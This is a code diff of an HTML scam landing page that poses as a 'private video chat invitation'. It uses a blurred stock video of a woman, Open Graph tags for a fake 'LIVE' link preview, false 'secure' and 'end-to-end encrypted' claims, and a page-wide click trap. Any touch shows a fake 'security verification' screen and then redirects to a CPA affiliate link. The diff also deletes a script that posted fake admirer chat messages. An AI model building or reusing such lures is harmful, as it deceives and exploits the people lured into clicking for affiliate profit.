@@ -3,33 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Stream - user_bedjfha5234</title>
+    <title>🔒 Private Video Chat Invitation</title>
+
+    <!-- 🔴 LINK PREVIEW / THUMBNAIL GENERATOR (Open Graph) -->
+    <!-- এই ট্যাগগুলোর কারণে টাইমলাইনে শেয়ার করলে কোনো ফটো বা লিংক না দেখিয়ে সরাসরি একটি রিয়েল লাইভ প্রিভিউ শো করবে -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="🔴 LIVE: Private Call Invitation from user_bedjfha5234">
+    <meta property="og:description" content="Click to accept the private 1-on-1 video room invitation. Connection is secure and confidential.">
+    <meta property="og:image" content="https://github.com/abir0679/pto/blob/main/546ee2882a00f938ad34ee64fdfbf743.jpg?raw=true">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
         
         body, html { 
             height: 100%; 
             width: 100%; 
-            background-color: #000; 
+            background-color: #050505; 
             overflow: hidden; 
         }
 
-        /* Blurred Fullscreen Video */
+        /* Highly Blurred Fullscreen Video (Creates heavy curiosity) */
         .bg-video {
             position: absolute;
             top: -5%; left: -5%;
             width: 110%; height: 110%;
             object-fit: cover;
             z-index: 1;
-            filter: blur(25px) brightness(0.4); 
+            filter: blur(30px) brightness(0.35); /* কড়া ব্লার ও ডার্ক ইফেক্ট */
             transform: scale(1.05); 
         }
 
-        /* UI Overlay Container */
-        .live-ui {
+        /* 1-on-1 Main UI Overlay */
+        .private-ui {
             position: absolute;
             top: 0; left: 0;
             width: 100%; height: 100%;
@@ -37,197 +46,144 @@
             display: flex;
             flex-direction: column;
             justify-content: space-between;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.5) 0%, transparent 20%, transparent 70%, rgba(0,0,0,0.85) 100%);
+            padding: 25px 20px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.7) 0%, transparent 30%, transparent 70%, rgba(0,0,0,0.9) 100%);
         }
 
-        /* Top Bar */
-        .top-bar {
-            padding: 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-        }
-
-        .host-info {
-            display: flex;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.4);
-            padding: 4px 15px 4px 4px;
-            border-radius: 30px;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .host-avatar {
-            width: 36px; height: 36px;
-            border-radius: 50%;
-            border: 2px solid #ff0055;
-        }
-
-        .host-details {
-            margin-left: 8px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .host-name {
-            color: #fff;
-            font-size: 13px;
-            font-weight: 700;
-        }
-
-        .viewer-count {
-            color: #ffcc00;
-            font-size: 11px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 3px;
-        }
-
-        .close-btn {
-            background: rgba(0,0,0,0.4);
-            width: 32px; height: 32px;
-            border-radius: 50%;
+        /* Top Header: Security Status */
+        .secure-header {
             display: flex;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
+            width: 100%;
         }
-        .close-btn svg { width: 14px; fill: white; }
 
-        /* Live Badge Top Right */
-        .live-badge-top {
-            position: absolute;
-            top: 15px;
-            right: 60px;
-            background: #ff0055;
-            color: white;
+        .status-badge {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            padding: 8px 16px;
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+            display: flex;
+            align-items: center;
+            gap: 8px;
             font-size: 12px;
-            font-weight: 800;
-            padding: 4px 10px;
-            border-radius: 4px;
-            animation: blink 1.5s infinite;
-            letter-spacing: 1px;
+            color: #10b981; /* Green color for secure */
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
         }
 
-        /* Unlock Text Overlay (Creates Curiosity) */
-        .unlock-overlay {
+        .pulse-dot {
+            width: 8px; height: 8px;
+            background: #10b981;
+            border-radius: 50%;
+            animation: blink 1.2s infinite;
+        }
+
+        /* Center Section: 1-on-1 Calling / Waiting Illusion */
+        .calling-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            margin-top: -30px;
+        }
+
+        .avatar-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .main-avatar {
+            width: 110px; height: 110px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid #ff0055;
+            box-shadow: 0 0 30px rgba(255, 0, 85, 0.6);
+            z-index: 5;
+            position: relative;
+        }
+
+        /* Pulsing Rings behind Avatar to look like an incoming private call */
+        .pulse-ring {
             position: absolute;
             top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-            z-index: 15;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            pointer-events: none;
-            text-align: center;
-        }
-        
-        .play-icon {
-            width: 60px; height: 60px;
-            background: rgba(255, 0, 85, 0.2);
-            border: 2px solid #ff0055;
+            width: 110px; height: 110px;
             border-radius: 50%;
-            display: flex; justify-content: center; align-items: center;
-            margin-bottom: 10px;
-            backdrop-filter: blur(5px);
-            animation: pulse-pink 2s infinite;
+            border: 2px solid #ff0055;
+            animation: ring-pulse 2s cubic-bezier(0.215, 0.610, 0.355, 1) infinite;
+            pointer-events: none;
         }
-        .play-icon svg { width: 25px; height: 25px; fill: #ff0055; margin-left: 4px; }
-        .unlock-text {
-            color: white; font-size: 16px; font-weight: 800; text-shadow: 0 2px 10px rgba(0,0,0,0.9);
+        .pulse-ring2 { animation-delay: 0.5s; }
+
+        .connection-id {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
         }
 
-        /* Chat & Action Area */
-        .bottom-area {
-            padding: 15px;
-            padding-bottom: 25px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
+        .main-notice {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 800;
+            line-height: 1.3;
+            margin-bottom: 12px;
+            padding: 0 10px;
         }
 
-        /* Fake Chat System */
-        .chat-container {
-            height: 140px;
-            width: 85%;
-            overflow: hidden;
-            position: relative;
-            mask-image: linear-gradient(to bottom, transparent, black 20%);
-            -webkit-mask-image: linear-gradient(to bottom, transparent, black 20%);
+        .sub-notice {
+            color: #ccc;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.5;
+            max-width: 290px;
         }
+        .sub-notice strong { color: #ff0055; }
 
-        .chat-messages {
-            position: absolute;
-            bottom: 0;
+        /* Bottom Section: Single Call Action Button */
+        .bottom-action {
             width: 100%;
             display: flex;
             flex-direction: column;
-            gap: 8px;
-        }
-
-        .chat-msg {
-            background: rgba(0, 0, 0, 0.5);
-            padding: 6px 12px;
-            border-radius: 15px;
-            color: white;
-            font-size: 13px;
-            width: fit-content;
-            backdrop-filter: blur(3px);
-            animation: slideUpFade 0.4s ease-out;
-            line-height: 1.4;
-        }
-        .chat-user { color: #ffcc00; font-weight: 700; margin-right: 5px; }
-
-        /* Action Bar */
-        .action-bar {
-            display: flex;
-            gap: 10px;
             align-items: center;
+            gap: 15px;
+            padding-bottom: 20px;
         }
 
-        .input-fake {
-            flex: 1;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 12px 15px;
-            border-radius: 30px;
-            color: #ddd;
-            font-size: 14px;
-            backdrop-filter: blur(5px);
-        }
-
-        .join-btn {
+        .accept-call-btn {
+            width: 100%;
+            max-width: 320px;
             background: #ff0055;
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 30px;
+            padding: 16px;
+            border-radius: 35px;
+            font-size: 16px;
             font-weight: 800;
-            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 8px 25px rgba(255, 0, 85, 0.5);
+            animation: button-bounce 2s infinite;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+        .accept-call-btn svg { fill: white; width: 22px; height: 22px; }
+
+        .secure-lock-text {
             display: flex;
             align-items: center;
             gap: 5px;
-            box-shadow: 0 0 15px rgba(255,0,85,0.5);
-            animation: pulse-pink 1.5s infinite;
+            color: #888;
+            font-size: 12px;
+            font-weight: 500;
         }
-
-        /* Floating Hearts Animation */
-        .hearts-container {
-            position: absolute;
-            bottom: 80px;
-            right: 15px;
-            width: 40px;
-            height: 200px;
-            pointer-events: none;
-        }
-        .heart {
-            position: absolute;
-            bottom: 0;
-            font-size: 22px;
-            opacity: 0;
-            animation: floatUp 3s linear infinite;
-        }
+        .secure-lock-text svg { fill: #888; width: 12px; height: 12px; }
 
         /* Master Click Trap */
         .click-trap { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; cursor: pointer; }
@@ -251,20 +207,23 @@
         .progress-bar-fill { height: 100%; width: 0%; background: #ff0055; transition: width 0.1s linear; }
 
         /* Animations */
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-        @keyframes pulse-pink { 0% { box-shadow: 0 0 0 0 rgba(255,0,85,0.6); } 70% { box-shadow: 0 0 0 15px rgba(255,0,85,0); } 100% { box-shadow: 0 0 0 0 rgba(255,0,85,0); } }
-        @keyframes slideUpFade { 0% { opacity: 0; transform: translateY(15px); } 100% { opacity: 1; transform: translateY(0); } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes floatUp {
-            0% { transform: translateY(0) scale(0.8); opacity: 1; }
-            50% { transform: translateY(-100px) translateX(-15px) scale(1.2); opacity: 0.8; }
-            100% { transform: translateY(-200px) translateX(10px) scale(1); opacity: 0; }
+        
+        @keyframes ring-pulse {
+            0% { width: 110px; height: 110px; opacity: 1; }
+            100% { width: 190px; height: 190px; opacity: 0; }
+        }
+
+        @keyframes button-bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.04); box-shadow: 0 12px 30px rgba(255, 0, 85, 0.7); }
         }
     </style>
 </head>
 <body>
 
-    <!-- Online Video Link of a moving person -->
+    <!-- Blurred Background Video of the Moving Girl -->
     <video id="liveVideo" class="bg-video" autoplay loop muted playsinline>
         <source src="https://assets.mixkit.co/videos/preview/mixkit-portrait-of-a-woman-in-a-pool-1259-large.mp4" type="video/mp4">
     </video>
@@ -272,58 +231,41 @@
     <!-- Master Click Trap triggers redirect anywhere user touches -->
     <div class="click-trap" onclick="startRedirect()"></div>
 
-    <!-- Live Stream UI -->
-    <div class="live-ui" id="step1">
+    <!-- 1-on-1 Exclusive Live UI -->
+    <div class="private-ui" id="step1">
         
-        <!-- Top Bar -->
-        <div class="top-bar">
-            <div class="host-info">
-                <img src="https://github.com/abir0679/pto/blob/main/546ee2882a00f938ad34ee64fdfbf743.jpg?raw=true" alt="Host" class="host-avatar">
-                <div class="host-details">
-                    <span class="host-name">user_bedjfha5234</span>
-                    <span class="viewer-count">
-                        <svg viewBox="0 0 24 24" width="12" height="12" fill="#ffcc00"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
-                        3,294
-                    </span>
-                </div>
-            </div>
-            <div class="live-badge-top">LIVE</div>
-            <div class="close-btn">
-                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        <!-- Top Status Bar -->
+        <div class="secure-header">
+            <div class="status-badge">
+                <span class="pulse-dot"></span> SECURE 1-ON-1 CONNECTION
             </div>
         </div>
 
-        <!-- Middle: Unlock Request to trigger click -->
-        <div class="unlock-overlay">
-            <div class="play-icon">
-                <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        <!-- Center Calling Info -->
+        <div class="calling-box">
+            <div class="avatar-container">
+                <img src="https://github.com/abir0679/pto/blob/main/546ee2882a00f938ad34ee64fdfbf743.jpg?raw=true" alt="Host" class="main-avatar">
+                <div class="pulse-ring"></div>
+                <div class="pulse-ring pulse-ring2"></div>
             </div>
-            <div class="unlock-text">Tap to unblur live stream</div>
-        </div>
-
-        <!-- Floating Hearts Area -->
-        <div class="hearts-container" id="hearts"></div>
-
-        <!-- Bottom Chat & Action Area -->
-        <div class="bottom-area">
             
-            <!-- Fake Chat Box -->
-            <div class="chat-container">
-                <div class="chat-messages" id="chat-box">
-                    <!-- Chats will be generated by JS -->
-                </div>
-            </div>
-
-            <!-- Action Bar -->
-            <div class="action-bar">
-                <div class="input-fake">Say something...</div>
-                <div class="join-btn">
-                    <svg viewBox="0 0 24 24" width="18" height="18" fill="white"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
-                    Join Call
-                </div>
-            </div>
-
+            <div class="connection-id">ROOM ID: #bedjfha5234</div>
+            <div class="main-notice">Private Live Cam is Waiting...</div>
+            <div class="sub-notice">You are the only guest invited to this room. Tap below to <strong>unblur the stream</strong> and start your private video chat.</div>
         </div>
+
+        <!-- Bottom Call Accept Section -->
+        <div class="bottom-action">
+            <button class="accept-call-btn">
+                <svg viewBox="0 0 24 24"><path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57-.35-.11-.74-.03-1.02.24l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.58l2.2-2.21c.28-.26.36-.65.25-1C8.7 6.45 8.5 5.25 8.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1z"/></svg>
+                ACCEPT PRIVATE CALL
+            </button>
+            <div class="secure-lock-text">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                End-to-end encrypted & 100% private
+            </div>
+        </div>
+
     </div>
 
     <!-- Trust Redirect Loader (Step 2) -->
@@ -331,9 +273,9 @@
         <div class="loader-container">
             <div class="spinner"></div>
             <div class="loading-title">Connecting Securely...</div>
-            <div class="loading-desc">To start your private live video chat with <strong>user_bedjfha5234</strong>, we are linking you to our secure verification portal:</div>
+            <div class="loading-desc">Establishing a private P2P video tunnel with <strong>user_bedjfha5234</strong>. Please standby for security validation:</div>
             <div class="domain-box">bedjfha.ussmpixl.com</div>
-            <div class="loading-note">Please complete the quick profile security verification. Once finished, you will instantly connect back to this live room.</div>
+            <div class="loading-note">Please complete the quick mobile profile verification to unlock the video stream. Once verified, the camera will instantly unblur.</div>
             <div class="progress-container">
                 <div class="progress-bar-fill"></div>
             </div>
@@ -344,105 +286,11 @@
         // Force Video Play
         document.addEventListener("DOMContentLoaded", function() {
             let vid = document.getElementById("liveVideo");
-            vid.play().catch(e => console.log("Waiting for interaction."));
+            vid.play().catch(e => console.log("Waiting for user interaction to play video."));
         });
 
-        // 🔴 UPDATED: 50 High-Converting, Psychological Fake Chat Messages
-        const usernames = [
-            "guest_902", "alex_pro", "user_xoxo", "mike_88", "johnny_99", 
-            "loverboy", "guest_743", "anon_22", "chris_m", "david_k", 
-            "jason_st", "ryan_love", "guest_112", "alpha_male", "tommy_g", 
-            "lonely_guy", "spark_99", "shadow_x", "mr_perfect", "guest_555"
-        ];
-        
-        const messages = [
-            "Wow 😍", 
-            "Unblur please!", 
-            "You look stunning 🔥", 
-            "How to join?",
-            "Turn around", 
-            "Can we talk privately?", 
-            "I just sent a request",
-            "Please accept my call", 
-            "So hot 🔥", 
-            "I want to see your face",
-            "Are you single?", 
-            "Damn, looking good!", 
-            "I'm waiting in the private room",
-            "Show more please", 
-            "You have a beautiful smile", 
-            "I love your eyes",
-            "Can't wait!", 
-            "Is this real?", 
-            "Omg so beautiful", 
-            "Reply me cutie",
-            "Check your inbox", 
-            "I want to send a gift", 
-            "You are perfect",
-            "Just joined the call guys, she is real!", 
-            "Don't ignore me",
-            "Please talk to me", 
-            "My dream girl", 
-            "I am in love", 
-            "Let's go private",
-            "Waiting for you...", 
-            "You are making me crazy", 
-            "Wow that dress!",
-            "I want to know you better", 
-            "Can you hear me?", 
-            "Send me a kiss 😘",
-            "You are glowing", 
-            "I need you", 
-            "Just sent a tip 💸", 
-            "How do I unblur this?",
-            "Click the screen to see guys!", 
-            "I am so lucky", 
-            "You are an angel",
-            "Please say my name", 
-            "I want to be yours", 
-            "So gorgeous!",
-            "Looking perfect today", 
-            "I'm addicted to you", 
-            "Private chat?",
-            "Accept my private request!", 
-            "Hey cutie"
-        ];
-        
-        function addFakeComment() {
-            const chatBox = document.getElementById("chat-box");
-            const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
-            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-            
-            const msgElement = document.createElement("div");
-            msgElement.className = "chat-msg";
-            msgElement.innerHTML = `<span class="chat-user">${randomUser}:</span> ${randomMsg}`;
-            
-            chatBox.appendChild(msgElement);
-
-            if(chatBox.children.length > 5) {
-                chatBox.removeChild(chatBox.firstChild);
-            }
-        }
-        setInterval(addFakeComment, Math.random() * 1500 + 1500);
-
-        // Floating Hearts Generator
-        const heartEmojis = ["❤️", "💖", "🔥", "😍", "✨"];
-        function spawnHeart() {
-            const container = document.getElementById("hearts");
-            const heart = document.createElement("div");
-            heart.className = "heart";
-            heart.innerText = heartEmojis[Math.floor(Math.random() * heartEmojis.length)];
-            
-            heart.style.left = Math.random() * 20 + "px";
-            heart.style.animationDuration = (Math.random() * 2 + 2) + "s";
-            
-            container.appendChild(heart);
-            setTimeout(() => { heart.remove(); }, 4000);
-        }
-        setInterval(spawnHeart, 800);
-
         // CPA Link Logic
-        const targetCpaLink = "https://bedjfha.litracksm.com/s/62b4abc4a39b9";
+        const targetCpaLink = "https://bedjfha.ussmpixl.com/p/2QMKv";
 
         function startRedirect() {
             if (navigator.vibrate) navigator.vibrate([100]); 
@@ -457,7 +305,7 @@
                     clearInterval(interval);
                     window.location.href = targetCpaLink;
                 } else {
-                    width += 6; 
+                    width += 7; // Fast loading screen (approx 1.5s)
                     progress.style.width = width + '%';
                 }
             }, 100); 
